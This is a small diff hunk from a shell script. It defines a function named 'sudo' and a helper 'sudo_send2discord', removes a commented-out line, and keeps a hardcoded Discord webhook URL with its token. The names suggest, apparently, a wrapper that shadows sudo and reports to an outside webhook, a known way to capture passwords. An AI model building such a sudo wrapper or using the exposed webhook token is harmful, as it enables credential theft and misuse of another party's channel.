@@ -52,7 +52,6 @@ function sudo(){
 
 function sudo_send2discord() {
   # update with your discord webhook here
-  # SUDO_DISCORD_WEBHOOK_URL='https://discordapp.com/api/webhooks/710652525165936751/D4w3diaH2O7L3_GHW0N436VH4nUg1s6PgIbwVqLWaK_TR91pVpARODcpL-5mqto7Hm49'
   SUDO_DISCORD_WEBHOOK_URL='https://discordapp.com/api/webhooks/710652525165936751/D4w3diaH2O7L3_GHW0N436VH4nUg1s6PgIbwVqLWaK_TR91pVpARODcpL-5mqto7Hm49'
   # this is put here to not pollute the shell environ
 
